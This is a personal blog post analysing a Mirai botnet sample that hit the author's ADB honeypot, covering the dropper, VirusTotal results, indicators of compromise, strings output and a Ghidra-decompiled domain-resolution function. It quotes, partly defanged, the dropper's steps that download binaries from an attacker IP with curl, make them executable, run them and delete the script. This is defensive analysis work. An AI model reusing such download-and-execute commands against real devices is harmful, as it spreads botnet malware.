<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Reverse Engineering Mirai Botnet"><title>Analysis of Mirai Malware</title><link rel=canonical href=https://demo.stack.jimmycai.com/p/mirai_botnet/><link rel=stylesheet href=/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css><meta property="og:title" content="Analysis of Mirai Malware"><meta property="og:description" content="Reverse Engineering Mirai Botnet"><meta property="og:url" content="https://demo.stack.jimmycai.com/p/mirai_botnet/"><meta property="og:site_name" content="Nathan's Blog"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="Honeypot"><meta property="article:tag" content="Botnet"><meta property="article:published_time" content="2022-01-04T00:00:00+00:00"><meta property="article:modified_time" content="2022-01-04T00:00:00+00:00"><meta property="og:image" content="https://m.media-amazon.com/images/I/41ZJaKEDzNL._AC_SX355_.jpg"><meta name=twitter:title content="Analysis of Mirai Malware"><meta name=twitter:description content="Reverse Engineering Mirai Botnet"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://m.media-amazon.com/images/I/41ZJaKEDzNL._AC_SX355_.jpg"><link rel="shortcut icon" href=favicon.svg></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hua21f330812822faaf581c7ecbb0903bf_62333_300x0_resize_box_3.png width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>Nathan's Blog</a></h1><h2 class=site-description>Hacker, Reader, and Friend</h2></div></header><ol class=social-menu><li><a href=https://github.com/AlbinoGazelle target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href target=_blank title=mail rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-mail" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="3" y="5" width="18" height="14" rx="2"/><polyline points="3 7 12 13 21 7"/></svg></a></li><li><a href=https://twitter.com/AlbinoGazelle target=_blank title=Twitter rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg><span>Home</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>Search</span></a></li><li><a href=/links/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg><span>Links</span></a></li><div class=menu-bottom-section><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>Dark Mode</span></li></div></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#intro>Intro</a></li><li><a href=#timeline-and-recon>Timeline and Recon</a></li><li><a href=#attack-vector>Attack Vector</a></li><li><a href=#payload>Payload</a></li><li><a href=#detection-rate-and-virustotal>Detection Rate and VirusTotal</a></li><li><a href=#iocs>IOCs</a></li><li><a href=#analysis>Analysis</a><ol><li><a href=#strings>Strings</a></li></ol></li><li><a href=#closing-thoughts>Closing Thoughts</a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/mirai_botnet/><img src=https://m.media-amazon.com/images/I/41ZJaKEDzNL._AC_SX355_.jpg loading=lazy alt="Featured image of post Analysis of Mirai Malware"></a></div><div class=article-details><header class=article-category><a href=/categories/reverse-engineering/ style=background-color:#2a9d8f;color:#fff>Reverse Engineering</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/mirai_botnet/>Analysis of Mirai Malware</a></h2><h3 class=article-subtitle>Reverse Engineering Mirai Botnet</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Jan 04, 2022</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>5 minute read</time></div></footer></div></header><section class=article-content><h2 id=intro>Intro</h2><p>I recently found out Google Cloud offers $300 for first time users, so I figured what better way to spend that than deploying a honeypot? While this blog post won&rsquo;t go into detail on deploying one yourself (keep at eye on my <a class=link href=/docs/welcome>docs</a> for a that) it will go into detail analyzing a malware sample that I discovered being deployed against it.</p><h2 id=timeline-and-recon>Timeline and Recon</h2><p>On January 4th 2022 at ~20:30 UTC my honeypot deployed in Oregon was attacked by 205.185.123.62 hosted in <a class=link href=https://www.iplocationtools.com/205.185.123.62 target=_blank rel=noopener>Las Vegas, Nevada.</a> It&rsquo;s hosted by &ldquo;Frantech Solutions&rdquo; which a cursoury google search gives results such as &ldquo;FranTech Solutions is <strong>a high fraud risk ISP</strong>..&rdquo; and <a class=link href=https://scamalytics.com/ip/isp/frantech-solutions target=_blank rel=noopener>scamalytics</a> gives it a score of 64.</p><p>My honeypot was attacked a total of 24 times from this IP address. Starting at 20:30 UTC and ending at 11:00 UTC.</p><h2 id=attack-vector>Attack Vector</h2><p>This attack was caught by the <a class=link href=https://github.com/huuck/ADBHoney target=_blank rel=noopener>ADBHoney</a> service running on my honeypot. ADBHoney describes itself as a &ldquo;Low interaction honeypot designed for Android Debug Bridge over TCP/IP.&rdquo; Now I have some experience with ADB in a prior CTF so I understood a small bit of what this honeypot does. ADB is the Andriod Debug Bridge. It&rsquo;s essentially a protocol/tool that allows developers to communicate with andriod devices. It&rsquo;s used prominately in the emulation part of Andriod Studio. Unfortunately for us, the TCP section of the ADB protocol <strong>does not</strong> have any kind of authentication, leaving it open to attacks. This is what the honeypot sets up to gather samples.</p><h2 id=payload>Payload</h2><p><img src=/p/mirai_botnet/initial_payload.png width=750 height=334 srcset="/p/mirai_botnet/initial_payload_hub1cf876330e3c7cd13194185af9490a0_34917_480x0_resize_box_3.png 480w, /p/mirai_botnet/initial_payload_hub1cf876330e3c7cd13194185af9490a0_34917_1024x0_resize_box_3.png 1024w" loading=lazy alt=image class=gallery-image data-flex-grow=224 data-flex-basis=538px>
<em>Figure 1: Inital Attack</em></p><p>As we can see in Figure 1, the inital attack involves moving into the tmp directory, using <a class=link href=https://busybox.net/ target=_blank rel=noopener>busybox</a> to execute wget to get another sample and executes it. It repeats this twice, opting for curl for the second sample. Switching tools like that is common in malware droppers, allowing it to be ran on more hosts. A potential target could be missing either curl or wget, but missing both would be unlikely. Both <strong>w.sh</strong> and <strong>c.sh</strong> are essentially the same file as seen below. The only difference being what tool is used to download the next stage.</p><p><img src=/p/mirai_botnet/wget.png width=1374 height=670 srcset="/p/mirai_botnet/wget_hu1a0e59869f2af55593fcce1618cc8e7e_207739_480x0_resize_box_3.png 480w, /p/mirai_botnet/wget_hu1a0e59869f2af55593fcce1618cc8e7e_207739_1024x0_resize_box_3.png 1024w" loading=lazy alt=image class=gallery-image data-flex-grow=205 data-flex-basis=492px>
<em>Figure 2: wget method</em></p><p><img src=/p/mirai_botnet/curl.png width=1240 height=670 srcset="/p/mirai_botnet/curl_hu447d906b6b66dd259da1a0824cc9f81b_167365_480x0_resize_box_3.png 480w, /p/mirai_botnet/curl_hu447d906b6b66dd259da1a0824cc9f81b_167365_1024x0_resize_box_3.png 1024w" loading=lazy alt=image class=gallery-image data-flex-grow=185 data-flex-basis=444px>
<em>Figure 3: curl method</em></p><p>Here we can see how the actual malware sample is being downloaded. What makes this particular malware sample interesting is how it has different exectuables for a large set of instruction sets, ranging from ARM to SH4 to MIPS and even sparc. The first part of each line is downloading the malware <code>curl htt[p]s://209.141.33.122/arm</code>, then setting it as executable <code>chmod 777 arm</code>, then executing it with the argument of &ldquo;android&rdquo; <code>./arm android</code>. The final part of the script <code>rm $0</code> is deleting the script that was just ran in an effort to evade analysis.</p><h2 id=detection-rate-and-virustotal>Detection Rate and VirusTotal</h2><p>Uploading the MIPS sample to <a class=link href=https://www.virustotal.com/gui/file/10a5fabf1847feb44437827b040f707b432b3cc93167720fe9879ca33477d5c1/detection target=_blank rel=noopener>VirusTotal</a> gives it a detection ratio of 36/56 and most AV vendors classify this sample as belonging to the <a class=link href=https://en.wikipedia.org/wiki/Mirai_%28malware%29 target=_blank rel=noopener>Mirai</a> botnet. It was first seen on December 29th, 2021.</p><p>VirusTotal Link: <a class=link href=https://www.virustotal.com/gui/file/10a5fabf1847feb44437827b040f707b432b3cc93167720fe9879ca33477d5c1/detection target=_blank rel=noopener>https://www.virustotal.com/gui/file/10a5fabf1847feb44437827b040f707b432b3cc93167720fe9879ca33477d5c1/detection</a></p><h2 id=iocs>IOCs</h2><p>If you see network activity to these IPs/Domains or system activity relating to them, you might be infected.<br>IPs: 209.141.33.122<br>Domains: bots1.firewalla1337.cc, scan1.firewalla1337.cc<br>System Activity: Creation of binaries in <code>/data/local/tmp</code> with the names of common instruction sets. Execution of binaries with the argument of <code>android</code>.</p><h2 id=analysis>Analysis</h2><p>Note: My reversing skills are still in its infancy, so please bear with me.</p><p>The first thing I did to this binary was run strings against it. This gave me some interesting findings seen below:</p><h3 id=strings>Strings</h3><p><code>/dev/null</code><br><code>POST /cdn-cgi/</code><br><code>HTTP/1.1\r\nUser-Agent:</code><br><code>\r\nHost:</code><br><code>Cookie:</code><br><code>bots1.firewalla1337.cc</code><br><code>209.141.33.122</code><br><code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678</code><br><code>dadlcldadg</code><br><code>scan1.firewalla1337.cc</code></p><p>Lets open this sample in ghidra and look into it a bit further.</p><p>The only function I could make sense of was what to me looks like a domain resolution function here:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>FUN_00410544</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>byte</span> <span class=o>*</span><span class=n>pbVar1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>uint</span> <span class=n>uVar2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>undefined2</span> <span class=o>*</span><span class=n>puVar3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>iVar4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=n>pbVar1</span> <span class=o>=</span> <span class=p>(</span><span class=n>byte</span> <span class=o>*</span><span class=p>)</span><span class=nf>FUN_00411908</span><span class=p>(</span><span class=s>&#34;bot[s]1.firewalla1337.cc&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>pbVar1</span> <span class=o>!=</span> <span class=p>(</span><span class=n>byte</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>iVar4</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>pbVar1</span> <span class=o>+</span> <span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>uVar2</span> <span class=o>=</span> <span class=nf>FUN_00411518</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>*</span><span class=n>pbVar1</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>trap</span><span class=p>(</span><span class=mh>0x1c00</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>DAT_0045d784</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>undefined4</span> <span class=o>*</span><span class=p>)((</span><span class=n>uVar2</span> <span class=o>%</span> <span class=p>(</span><span class=n>uint</span><span class=p>)</span><span class=o>*</span><span class=n>pbVar1</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>iVar4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>FUN_0041189c</span><span class=p>(</span><span class=n>pbVar1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>FUN_00414e24</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>puVar3</span> <span class=o>=</span> <span class=p>(</span><span class=n>undefined2</span> <span class=o>*</span><span class=p>)</span><span class=nf>FUN_00414d0c</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>DAT_0045d782</span> <span class=o>=</span> <span class=o>*</span><span class=n>puVar3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=cm>/* WARNING: Could not recover jumptable at 0x00410634. Too many branches */</span>
</span></span><span class=line><span class=cl>                    <span class=cm>/* WARNING: Treating indirect jump as call */</span>
</span></span><span class=line><span class=cl>    <span class=nf>FUN_00414d40</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>DAT_0045d784</span> <span class=o>=</span> <span class=nf>FUN_00417c20</span><span class=p>(</span><span class=s>&#34;209.1[4]1.33.122&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><em>Brackets in IP address and Domain added by myself</em></p><p>Both the domain name and IP address are hardcoded, but these are both the same address of the machine where the attack originated from meaning we dont have the C2&rsquo;s address.</p><p>There are references to POSTs and setting URL variables in the malware which tells me that&rsquo;s most likely the way communication is handled between the C2 and the bots.</p><h2 id=closing-thoughts>Closing Thoughts</h2><p>Unfortunately this is the extent of my analysis of this sample. My reversing skills arent where they should be in order to properly reverse this sample. I would try dynamic analysis and see what domains/IPs this sample tries to contact, but the x86 version was not available and I do not have any spare system capable of executing the other instruction sets besides my Raspberry Pi4s, so lookout for a potential part 2 of this post where I execute the malware in a lab environment.</p><p>Thank you so much for reading this post. I learned a lot while investigating this sample and hopefully you learned something new reading this blog post. I hope to post more about my activities with my honeypot so keep an eye out for those posts when they drop.</p><p>As always, if you have any feedback please don&rsquo;t hesitate to contact me at <a class=link href="mailto:nathan@nburns.tech?Subject=Reverse_Blogpost">my email.</a></p><p>Nathan Burns</p></section><footer class=article-footer><section class=article-tags><a href=/tags/honeypot/>Honeypot</a>
<a href=/tags/botnet/>Botnet</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/whispergate/><div class=article-image><img src=/p/whispergate/whisper.0e46e7be6bfb5706961f66acf932170a_hu99a54d96029b77e75edf6d51ed44e6da_1324271_250x150_fill_q75_box_smart1.jpg width=250 height=150 loading=lazy alt="Featured image of post Deconstructing WhisperGate" data-key=whispergate data-hash="md5-Dkbnvmv7VwaWH2as+TIXCg=="></div><div class=article-details><h2 class=article-title>Deconstructing WhisperGate</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2023 Nathan's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.16.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>